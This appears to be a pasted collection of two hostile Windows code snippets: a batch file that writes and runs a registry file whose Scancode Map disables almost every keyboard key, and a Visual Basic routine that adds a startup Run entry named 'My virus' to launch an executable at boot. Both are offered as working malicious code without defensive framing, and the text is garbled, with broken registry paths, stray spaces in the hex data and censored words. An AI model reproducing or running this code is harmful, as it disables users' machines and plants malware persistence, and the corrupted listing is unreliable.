
@echo off
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINESYSTEMControlSet001ControlKeyboa rd Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,0 0 ,01,00,00, >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00 ,3f,00,00,00,40,00,00,00, >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57 ,00,00,00,58,00,00,00,37, >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00 ,00,00,4a,00,00,00,47,00, >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00 ,00,4d,00,00,00,4e,00,00, >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00 ,53,00,00,00,52,00,00,00, >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52 ,e0,00,00,47,e0,00,00,49, >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00 ,00,00,02,00,00,00,03,00, >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00 ,00,08,00,00,00,09,00,00, >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00 ,0e,00,00,00,0f,00,00,00, >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14 ,00,00,00,15,00,00,00,16, >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00 ,00,00,1b,00,00,00,2b,00, >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00 ,00,21,00,00,00,22,00,00, >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00 ,27,00,00,00,28,00,00,00, >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e ,00,00,00,2f,00,00,00,30, >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00 ,00,00,35,00,00,00,36,00, >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00 ,00,38,e0,00,00,5c,e0,00, >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00 ,22,e0,00,00,24,e0,00,00, >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c ,e0,00,00,20,e0,00,00,6a, >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0 ,00,00,6c,e0,00,00,6d,e0, >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
start nokeyboard.reg

Option Explicit

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

Private Const REG_SZ = 1

Private Const LOCALMACHINE = &H80000002

Private Sub Command1_Click()

Dim InputValue As String

Dim nBufferKey As Long, nBufferSubKey As Long

RegCreateKey LOCALMACHINE, "SOFTWARE\JPRODUCTIONS", nBufferKey

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

InputValue = "c:\******s\system\Project12.exe"

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

RegSetValueEx nBufferSubKey, "My virus", 0, REG_SZ, InputValue, Len(InputValue)

End Sub